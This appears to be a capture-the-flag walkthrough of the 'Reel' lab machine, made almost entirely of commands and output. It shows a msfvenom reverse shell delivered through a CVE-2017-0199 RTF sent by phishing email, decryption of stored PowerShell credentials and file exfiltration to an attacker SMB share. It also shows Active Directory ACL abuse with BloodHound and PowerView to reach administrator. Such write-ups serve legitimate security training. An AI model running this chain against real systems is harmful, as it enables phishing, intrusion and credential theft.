# Reel
## ftp
## CVE
## bloodhound
## impacket-smbserver
## powersploit
``````

➜  ~ echo "10.10.10.77 reel.htb" | sudo tee -a /etc/hosts

➜  ~ rustscan -a reel.htb --ulimit 5000

Open 10.10.10.77:21
Open 10.10.10.77:22
Open 10.10.10.77:25

➜  ~ sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Reel -vv reel.htb

PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 7.6 (protocol 2.0)
25/tcp open  smtp?   syn-ack ttl 127

➜  ~ sudo nmap -Pn -A -T4 -p- -vv reel.htb

PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQkehAZGj87mZluxFiVu+GPAAnC/OQ9QKUF2wlIwvefrD2L4zWyGXlAgSbUq/MqujR/efrTIjPYWK+5Mlxc7gEoZBylGAPbdxFivL8YQs3dQPt6aHNF0v+ABS01L2qZ4ewd1sTi1TlT6LtWHehX2PBJ6S3LWG09v+E/3ue97y9gaOjfA6BCMWgQ7K3yvQeHrRpBSk/vQxfCh4TINwV3EGbGTfbs8VvvR+Et7weB5EOifgXfHbyh04KemONkceFSAnjRRYOgwvtXai9imsDJ8KtS2RMR197VK4MBhsY7+h0nOvUMgm76RcRc6N8GW1mn6gWp98Ds9VeymzAmQvprs97
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAw2CYanDlTRpGqzVXrfGTcAYVe/vUnnkWicQPzdfix5gFsv4nOGNUM+Fko7QAW0jqCFQKc8anGAwJjFGLTB00k=
|   256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICdDfn+n5xueGtHP20/aPkI8pvCfxb2UZA3RQdqnpjBk
25/tcp open  smtp?   syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

➜  ftp reel.htb

name: anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: ''

ftp> ls

05-29-18  12:19AM       <DIR>          documents

ftp> cd documents
ftp> ls

05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx

ftp> get readme.txt
ftp> type binary
ftp> get AppLocker.docx
ftp> get Windows Event Forwarding.docx

cat readme.txt 
xdg-open AppLocker.docx
xdg-open 'Windows Event Forwarding.docx'
➜  exiftool Windows\ Event\ Forwarding.docx 

Creator                  : nico@megabank.com

➜  cd /home/windows_kali/htb/Active_Directory_101/Reel
➜  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=10060 -f hta-psh -o msfv.hta

➜  /opt mkdir python-2-and-3
➜  /opt cd python-2-and-3 
➜  docker pull sculpto/python2-and-3
➜  python-2-and-3 sudo docker run -it sculpto/python2-and-3 /bin/sh
/ # mkdir opt
/ # cd /opt
/opt # git clone https://github.com/bhdresh/CVE-2017-0199
/opt # cd CVE-2017-0199/
/opt/CVE-2017-0199 # python cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.16.3/msfv.hta -t rtf -x 0

# References
https://github.com/cclauss/Python2-and-Python3-in-Docker
https://github.com/bhdresh/CVE-2017-0199

Generating normal RTF payload.
Generated invoice.rtf successfully

➜  sendemail -f c0rvu5@megabank.com -t nico@megabank.com -u 'Check me' -m 'Required check' -a invoice.rtf -s 10.10.10.77 -v

Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: DEBUG => Connecting to 10.10.10.77:25
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: DEBUG => My IP address is: 10.10.16.3
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: SUCCESS => Received: 	220 Mail Service ready
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: INFO => Sending: 	EHLO desktop-h0tc0nu.localdomain
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: SUCCESS => Received: 	250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: INFO => Sending: 	MAIL FROM:<c0rvu5@megabank.com>
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: SUCCESS => Received: 	250 OK
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: INFO => Sending: 	RCPT TO:<nico@megabank.com>
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: SUCCESS => Received: 	250 OK
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: INFO => Sending: 	DATA
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: SUCCESS => Received: 	354 OK, send.
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: INFO => Sending message body
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: Setting content-type: text/plain
Jul 04 04:20:24 desktop-h0tc0nu sendemail[8805]: DEBUG => Sending the attachment [invoice.rtf]
Jul 04 04:20:36 desktop-h0tc0nu sendemail[8805]: SUCCESS => Received: 	250 Queued (11.515 seconds)
Jul 04 04:20:36 desktop-h0tc0nu sendemail[8805]: Email was sent successfully!  From: <c0rvu5@megabank.com> To: <nico@megabank.com> Subject: [Check me] Attachment(s): [invoice.rtf] Server: [10.10.10.77:25]

➜  sudo docker cp d548f2ae257a:/opt/CVE-2017-0199/invoice.rtf ~/htb/Active_Directory_101/Reel

➜  ~ sudo nc -lvnp 10060

➜  sudo python -m http.server 80

C:\Windows\system32>whoami

htb\nico

C:\Windows\system32>powershell.exe get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\nico\Desktop

Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-ar--        28/10/2017     00:40         32 user.txt 

C:\Windows\system32>type C:\Users\nico\Desktop\user.txt

user_flag

C:\Windows\system32>powershell.exe get-childitem -path C:\Users -include *.xml* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\nico\Desktop

Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
-ar--        28/10/2017     00:59       1468 cred.xml                                                                  

C:\Windows\system32>type C:\Users\nico\Desktop\cred.xml

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>

C:\Windows\system32>powershell -c "$cred = Import-CliXml -Path C:\Users\nico\Desktop\cred.xml; $cred.GetNetworkCredential() | Format-List *"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB

➜  ssh tom@reel.htb

Password: 1ts-mag1c!!!

PS C:\Users\tom\desktop\AD Audit\BloodHound> dir                                                                                

    Directory: C:\Users\tom\desktop\AD Audit\BloodHound                                                                         

Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d----         5/29/2018   8:57 PM            Ingestors                                                                          
-a---        10/30/2017  10:15 PM     769587 PowerView.ps1 

PS C:\Users\tom\desktop\AD Audit\BloodHound\Ingestors> dir                                                                      

    Directory: C:\Users\tom\desktop\AD Audit\BloodHound\Ingestors                                                               

Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---        11/16/2017  11:50 PM     112225 acls.csv                                                                           
-a---        10/28/2017   9:50 PM       3549 BloodHound.bin                                                                     
-a---        10/24/2017   4:27 PM     246489 BloodHound_Old.ps1                                                                 
-a---        10/24/2017   4:27 PM     568832 SharpHound.exe                                                                     
-a---        10/24/2017   4:27 PM     636959 SharpHound.ps1 

➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

PS C:\Users\tom\AppData\Local\Temp>  net use \\10.10.16.3\share /u:hey hey
PS C:\Users\tom\AppData\Local\Temp>  copy acls.csv \\10.10.16.6\share

➜  xdg-open acls.csv

Ctrl+f
Type:

tom
Enter x 6

Find:

claire@HTB.LOCAL	USER		tom@HTB.LOCAL	USER	WriteOwner		AccessAllowed	False

Ctrl+f
Type:

claire

Enter x 16

Find:

Backup_Admins@HTB.LOCAL	GROUP		claire@HTB.LOCAL	USER	WriteDacl		AccessAllowed	False

Alternatively,

➜  python -m http.server 

PS C:\Users\tom\AppData\Local\Temp> invoke-webrequest -Uri “10.10.16.3:8000/SharpHound.ps1” -OutFile 'C:\Users\tom\AppData\Local\Temp\SharpHound.ps1'

PS C:\Users\tom\AppData\Local\Temp> powershell.exe -executionpolicy bypass

PS C:\Users\tom\AppData\Local\Temp> invoke-bloodhound -collectall 

➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

PS C:\Users\tom\AppData\Local\Temp>  net use \\10.10.16.3\share /u:hey hey
PS C:\Users\tom\AppData\Local\Temp>  copy 20220704082659_BloodHound.zip \\10.10.16.6\share
PS C:\Users\tom\AppData\Local\Temp>  del 20220704082659_BloodHound.zip
PS C:\Users\tom\AppData\Local\Temp>  net use /d \\10.10.16.3\share

➜  ~ docker start neo4j-server
➜  ~ sudo neo4j start
➜  ~ cd /bin/BloodHound-linux-x64 ; ./BloodHound --no-sandbox

Go to: Upload Data
Upload:

~/htb/Active_Directory_101/Reel/20220704082659_BloodHound.zip

Type into search:

tom

Click: 

TOM@HTB.LOCAL

Right-click 'TOM@HTB.LOCAL' icon
Select: 

'! Mark User as Owned'

Left-click 'TOM@HTB.LOCAL' icon

Go to: 'Node Info' -> 'OUTBOUND CONTROL RIGHTS' -> Left-click 'First Degree Object Control'

Hover over: 'WriteOwner' -> Right-click -> Help

Response:

'The user TOM@HTB.LOCAL has the ability to modify the owner of the user CLAIRE@HTB.LOCAL. Object owners retain the ability to modify object security descriptors, regardless of permissions on the objects DACL.'

PS C:\Users\tom\desktop\AD Audit\BloodHound> import-module .\PowerView.ps1                                                      
PS C:\Users\tom\desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
PS C:\Users\tom\desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                                                                                                            
PS C:\Users\tom\desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "c0rvu5w45h3r3!" -AsPlainText -force                 
PS C:\Users\tom\desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred  

➜  ~ ssh claire@reel.htb

Password: c0rvu5w45h3r3!

C:\Users\claire>net group backup_admins claire /add

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1

# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"      

➜  ~ ssh administrator@reel.htb

Password: Cr4ckMeIfYouC4n!

administrator@REEL C:\Users\Administrator>powershell.exe get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorActio
n SilentlyContinue    

    Directory: C:\Users\Administrator\Desktop                                                                                   

Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---        28/10/2017     12:56         32 root.txt                                                                           

    Directory: C:\Users\nico\Desktop                                                                                            

Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-ar--        28/10/2017     00:40         32 user.txt   

administrator@REEL C:\Users\Administrator>type C:\Users\nico\Desktop\user.txt

user_flag

administrator@REEL C:\Users\Administrator>type C:\Users\Administrator\Desktop\root.txt

root_flag

``````

##### References
https://github.com/cclauss/Python2-and-Python3-in-Docker
https://github.com/bhdresh/CVE-2017-0199

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703224648.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703224712.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703232505.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703235648.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703235726.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703235612.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220703233908.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704013033.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704025633.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704025605.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704025744.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704030003.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704030043.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704030056.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704031858.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704032202.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704032354.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220704032642.png)

#hacking
